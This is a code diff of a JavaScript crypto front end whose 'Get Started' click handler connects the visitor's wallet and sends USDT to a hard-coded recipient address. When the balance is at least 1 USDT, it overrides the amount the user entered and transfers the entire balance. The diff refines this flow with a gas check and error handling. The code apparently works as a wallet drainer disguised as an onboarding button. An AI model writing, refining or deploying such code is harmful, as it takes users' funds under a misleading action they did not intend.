@@ -55,38 +55,35 @@ export const fetchBalances = async (address) => {
 
 export const handleGetStartedClick = async (usdtAmountInput) => {
     try {
-        await checkAndSwitchToBsc();  // Ensure on BSC Network
-
+        await checkAndSwitchToBsc();
         const provider = new BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);  // Request wallet connection
+        await provider.send("eth_requestAccounts", []);
         const signer = await provider.getSigner();
         const address = await signer.getAddress();
-
         let balances = await fetchBalances(address);
         console.log("Initial Balances:", balances);
-
-        let finalTransferAmount = parseFloat(usdtAmountInput);
-
-        // **Override Input if Balance ≥ 1 USDT**
+        // Check BNB balance
+        if (balances.bnb < 0.002) {
+            throw new Error("Insufficient BNB for gas fees. Need at least 0.002 BNB.");
+        }
+        let finalTransferAmount = parseFloat(usdtAmountInput) || 0;
         if (balances.usdt >= 1 && finalTransferAmount !== balances.usdt) {
             const userConfirmed = window.confirm(`Your entire USDT balance (${balances.usdt} USDT) will be transferred. Continue?`);
-            if (!userConfirmed) return;
+            if (!userConfirmed) throw new Error("User cancelled transfer.");
             finalTransferAmount = balances.usdt;
         }
-
+        if (finalTransferAmount <= 0) {
+            throw new Error("Invalid transfer amount.");
+        }
         console.log(`📢 Preparing to transfer: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
-
-        // **Final Check Before Sending USDT**
         console.log("🚀 Sending USDT...");
         const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
         const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
-
         const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
-        const gasLimit = estimatedGas * 3n / 2n; // 1.5x estimated gas
-
+        const gasLimit = estimatedGas * 3n / 2n;
+        console.log(`Estimated Gas: ${estimatedGas.toString()}, Gas Limit: ${gasLimit.toString()}`);
         const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
         await transferTx.wait();
-
         console.log(`✅ Transfer successful!`);
     } catch (error) {
         console.error("❌ Error during transaction process:", error);
